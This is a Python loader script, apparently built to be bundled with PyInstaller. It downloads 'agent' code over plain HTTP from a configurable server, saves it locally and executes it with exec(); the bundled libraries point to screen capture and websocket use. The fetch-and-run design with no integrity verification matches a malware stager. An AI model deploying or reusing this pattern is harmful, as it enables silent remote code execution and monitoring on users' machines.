import os
import sys
import socket
import time
import json
import io
import threading
import asyncio
import urllib.request

# Package dependencies so PyInstaller bundles them
import requests
import mss
import PIL
import PIL.Image
import websockets

# Default server IP
SERVER_IP = "10.128.56.41"

def load_server_ip():
    global SERVER_IP
    if os.path.exists("server_ip.txt"):
        try:
            with open("server_ip.txt", "r", encoding="utf-8") as f:
                ip = f.read().strip()
                if ip:
                    SERVER_IP = ip
                    print(f"[Loader] Server IP loaded from server_ip.txt: {SERVER_IP}")
                    return
        except Exception as e:
            print(f"[Loader] Failed to read server_ip.txt: {e}")
    print(f"[Loader] Using default Server IP: {SERVER_IP}")

def main():
    # Change working directory to the executable's directory
    try:
        exe_dir = os.path.dirname(os.path.abspath(sys.argv[0]))
        os.chdir(exe_dir)
        print(f"[Loader] Working directory set to: {exe_dir}")
    except Exception as e:
        print(f"[Loader] Failed to set working directory: {e}")

    load_server_ip()
    
    url = f"http://{SERVER_IP}:8888/download_agent"
    print(f"[Loader] Attempting to download latest agent code from {url}...")
    
    download_success = False
    try:
        # Download with a 5-second timeout
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as response:
            code = response.read().decode('utf-8')
            # Basic sanity check to ensure it's a python script containing run()
            if code and "def run():" in code:
                with open("FINAL_AGENT_PRO.py", "w", encoding="utf-8") as f:
                    f.write(code)
                print("[Loader] Update successful.")
                download_success = True
            else:
                print("[Loader] Downloaded file validation failed (missing 'def run():').")
    except Exception as e:
        print(f"[Loader] Failed to download agent code: {e}")

    # Determine code to run
    code_to_run = None
    if download_success:
        try:
            with open("FINAL_AGENT_PRO.py", "r", encoding="utf-8") as f:
                code_to_run = f.read()
        except Exception as e:
            print(f"[Loader] Error reading updated file: {e}")
    else:
        if os.path.exists("FINAL_AGENT_PRO.py"):
            print("[Loader] Running cached local version of FINAL_AGENT_PRO.py...")
            try:
                with open("FINAL_AGENT_PRO.py", "r", encoding="utf-8") as f:
                    code_to_run = f.read()
            except Exception as e:
                print(f"[Loader] Error reading cached file: {e}")
        else:
            print("[Loader] No cached FINAL_AGENT_PRO.py found.")

    if code_to_run:
        print("[Loader] Launching agent...")
        try:
            # Execute the script dynamically in __main__ namespace
            global_namespace = globals().copy()
            global_namespace['__name__'] = '__main__'
            exec(code_to_run, global_namespace)
        except Exception as e:
            print(f"[Loader] Error running agent script: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(10)
    else:
        print("[Loader] Critical Error: No agent script available to execute.")
        time.sleep(10)

if __name__ == "__main__":
    main()
